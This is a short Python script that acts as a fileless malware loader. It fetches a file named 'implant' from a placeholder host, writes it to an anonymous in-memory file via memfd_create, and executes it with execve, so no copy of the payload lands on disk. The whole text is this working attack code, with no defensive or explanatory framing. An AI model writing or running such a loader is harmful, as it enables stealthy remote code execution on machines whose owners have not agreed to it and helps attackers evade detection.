import urllib.request, os, ctypes

IMPLANT_URL = "https://<DOMAIN>/implant"

data = urllib.request.urlopen(IMPLANT_URL).read()
fd = os.memfd_create('', 0)
os.write(fd, data)

os.execve(f'/proc/self/fd/{fd}', [f'/proc/self/fd/{fd}'], {})
